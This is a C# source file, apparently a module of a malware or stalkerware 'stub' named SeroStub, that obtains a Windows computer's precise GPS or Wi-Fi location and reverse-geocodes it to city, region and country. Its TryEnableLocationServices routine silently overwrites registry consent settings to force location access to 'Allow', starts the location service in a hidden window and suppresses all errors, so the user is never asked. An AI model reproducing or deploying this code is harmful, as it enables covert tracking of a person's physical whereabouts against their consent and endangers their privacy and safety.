using System.Globalization;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Text.Json.Serialization;
using Microsoft.Win32;

namespace SeroStub;

// Primary: Windows Location COM API (ILocation / locationapi.h — Vista+, deprecated but functional on Win10/11).
// Covers GPS, Wi-Fi triangulation and cell-tower data without pulling in WinRT CsWinRT projection.
// Reverse geocoding: Nominatim (OpenStreetMap) from real coordinates.
internal static class GeoFeature
{
    // locationapi.h GUIDs
    private static readonly Guid CLSID_Location     = new("E5B8E079-EE6D-4E33-A438-C87F2E959254");
    private static readonly Guid IID_ILocation      = new("AB2BC69E-A14D-4AE6-B0D7-2709FBD0C43C");
    private static readonly Guid IID_ILatLongReport = new("7A7C3277-8F84-4636-95B2-EBB5507FF77E");

    [DllImport("ole32.dll")] private static extern int  CoCreateInstance(ref Guid clsid, nint inner, uint ctx, ref Guid iid, out nint ppv);
    [DllImport("ole32.dll")] private static extern int  CoInitializeEx(nint reserved, uint mode);
    [DllImport("ole32.dll")] private static extern void CoUninitialize();

    private static nint Vtbl(nint com, int n) => Marshal.ReadIntPtr(Marshal.ReadIntPtr(com), n * IntPtr.Size);

    // IUnknown::QueryInterface
    private delegate int QiDelegate(nint self, ref Guid iid, out nint ppv);
    // ILocation vtable offsets (IUnknown = 0-2):
    //   3 RegisterForReport  4 UnregisterForReport  5 GetReport
    //   6 GetReportStatus    7 GetReportInterval    8 SetReportInterval
    //   9 GetDesiredAccuracy 10 SetDesiredAccuracy  11 RequestPermissions
    private delegate int GetReportDelegate          (nint self, ref Guid reportType, out nint ppReport);
    private delegate int SetDesiredAccuracyDelegate (nint self, ref Guid reportType, int accuracy);
    private delegate int SetReportIntervalDelegate  (nint self, ref Guid reportType, uint ms);
    private delegate int RequestPermissionsDelegate (nint self, nint hwnd, ref Guid reportTypes, uint count, [MarshalAs(UnmanagedType.Bool)] bool modal);
    // ILatLongReport vtable offsets (ILocationReport = IUnknown = 0-2, GetSensorID=3, GetTimestamp=4, GetValue=5):
    //   6 GetLatitude  7 GetLongitude  8 GetErrorRadius  9 GetAltitude  10 GetAltitudeError
    private delegate int GetLatitudeDelegate   (nint self, out double val);
    private delegate int GetLongitudeDelegate  (nint self, out double val);
    private delegate int GetErrorRadiusDelegate(nint self, out double val);

    private static readonly HttpClient _http = new()
    {
        Timeout = TimeSpan.FromSeconds(8),
        DefaultRequestHeaders = { { "User-Agent", "Mozilla/5.0" } }
    };

    internal static async Task<string> GetLocationAsync()
    {
        try
        {
            TryEnableLocationServices();

            var tcs = new TaskCompletionSource<(double lat, double lon, double acc, bool ok, string err)>();
            var thread = new Thread(() =>
            {
                double lat = 0, lon = 0, acc = 0;
                try
                {
                    CoInitializeEx(nint.Zero, 0); // MTA — ILocation COM proxy handles marshaling to lfsvc STA
                    try
                    {
                        var clsid  = CLSID_Location;
                        var locIid = IID_ILocation;
                        if (CoCreateInstance(ref clsid, nint.Zero, 1, ref locIid, out var loc) != 0)
                        { tcs.SetResult((0, 0, 0, false, "Location service unavailable (lfsvc not running).")); return; }

                        var iidLL   = IID_ILatLongReport;
                        Marshal.GetDelegateForFunctionPointer<SetDesiredAccuracyDelegate>(Vtbl(loc, 10))(loc, ref iidLL, 1); // HIGH
                        Marshal.GetDelegateForFunctionPointer<SetReportIntervalDelegate> (Vtbl(loc, 8)) (loc, ref iidLL, 0); // fastest
                        Marshal.GetDelegateForFunctionPointer<RequestPermissionsDelegate>(Vtbl(loc, 11))(loc, nint.Zero, ref iidLL, 1, false);

                        var getRep   = Marshal.GetDelegateForFunctionPointer<GetReportDelegate>(Vtbl(loc, 5));
                        var deadline = Environment.TickCount64 + 15_000;
                        bool ok = false;

                        while (!ok && Environment.TickCount64 < deadline)
                        {
                            var r = IID_ILatLongReport;
                            if (getRep(loc, ref r, out var pRep) == 0 && pRep != nint.Zero)
                            {
                                var qi   = Marshal.GetDelegateForFunctionPointer<QiDelegate>(Vtbl(pRep, 0));
                                var llId = IID_ILatLongReport;
                                if (qi(pRep, ref llId, out var pLL) == 0 && pLL != nint.Zero)
                                {
                                    bool latOk = Marshal.GetDelegateForFunctionPointer<GetLatitudeDelegate>   (Vtbl(pLL, 6))(pLL, out lat) == 0;
                                    bool lonOk = Marshal.GetDelegateForFunctionPointer<GetLongitudeDelegate>  (Vtbl(pLL, 7))(pLL, out lon) == 0;
                                    Marshal.GetDelegateForFunctionPointer<GetErrorRadiusDelegate>(Vtbl(pLL, 8))(pLL, out acc);
                                    Marshal.Release(pLL);
                                    ok = latOk && lonOk;
                                }
                                Marshal.Release(pRep);
                            }
                            if (!ok) Thread.Sleep(500);
                        }

                        Marshal.Release(loc);
                        tcs.SetResult(ok
                            ? (lat, lon, acc, true, "")
                            : (0, 0, 0, false, "No location fix. Enable via Settings → Privacy → Location."));
                    }
                    finally { CoUninitialize(); }
                }
                catch (Exception ex) { tcs.SetResult((0, 0, 0, false, ex.Message)); }
            }) { IsBackground = true };
            thread.Start();

            var (lat, lon, acc, gotFix, errMsg) = await tcs.Task.WaitAsync(TimeSpan.FromSeconds(20));
            if (!gotFix) return Error(errMsg);

            string city = "", region = "", country = "";
            try
            {
                var resp = await _http.GetStringAsync(
                    $"https://nominatim.openstreetmap.org/reverse?format=jsonv2" +
                    $"&lat={lat.ToString("G", CultureInfo.InvariantCulture)}" +
                    $"&lon={lon.ToString("G", CultureInfo.InvariantCulture)}" +
                    $"&accept-language=en");
                var nm = JsonSerializer.Deserialize(resp, NominatimCtx.Default.NominatimResponse);
                if (nm?.Address is { } a)
                {
                    city    = a.City ?? a.Town ?? a.Village ?? a.Suburb ?? a.County ?? "";
                    region  = a.State ?? "";
                    country = a.Country ?? "";
                }
            }
            catch { }

            return JsonSerializer.Serialize(new GeoResultStub
            {
                Lat      = lat,
                Lon      = lon,
                Accuracy = acc,
                Source   = "Windows.Location",
                City     = city,
                Region   = region,
                Country  = country,
            }, SeroJson.Default.GeoResultStub);
        }
        catch (Exception ex) { return Error(ex.Message); }
    }

    private static void TryEnableLocationServices()
    {
        try
        {
            Registry.SetValue(
                @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
                "Value", "Allow");
        }
        catch { }

        try
        {
            Registry.SetValue(
                @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}",
                "SensorPermissionState", 1, RegistryValueKind.DWord);
        }
        catch { }

        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("sc.exe", "start lfsvc")
                { CreateNoWindow = true, UseShellExecute = false });
        }
        catch { }
    }

    private static string Error(string msg) =>
        JsonSerializer.Serialize(new GeoResultStub { Error = msg }, SeroJson.Default.GeoResultStub);
}

[JsonSerializable(typeof(NominatimResponse))]
internal partial class NominatimCtx : JsonSerializerContext { }

internal class NominatimResponse
{
    [JsonPropertyName("address")] public NominatimAddress? Address { get; set; }
}

internal class NominatimAddress
{
    [JsonPropertyName("city")]    public string? City    { get; set; }
    [JsonPropertyName("town")]    public string? Town    { get; set; }
    [JsonPropertyName("village")] public string? Village { get; set; }
    [JsonPropertyName("suburb")]  public string? Suburb  { get; set; }
    [JsonPropertyName("county")]  public string? County  { get; set; }
    [JsonPropertyName("state")]   public string? State   { get; set; }
    [JsonPropertyName("country")] public string? Country { get; set; }
}

internal class GeoResultStub
{
    public double Lat      { get; set; }
    public double Lon      { get; set; }
    public double Accuracy { get; set; }
    public string Source   { get; set; } = "";
    public string City     { get; set; } = "";
    public string Region   { get; set; } = "";
    public string Country  { get; set; } = "";
    public string Isp      { get; set; } = "";
    public string Error    { get; set; } = "";
}
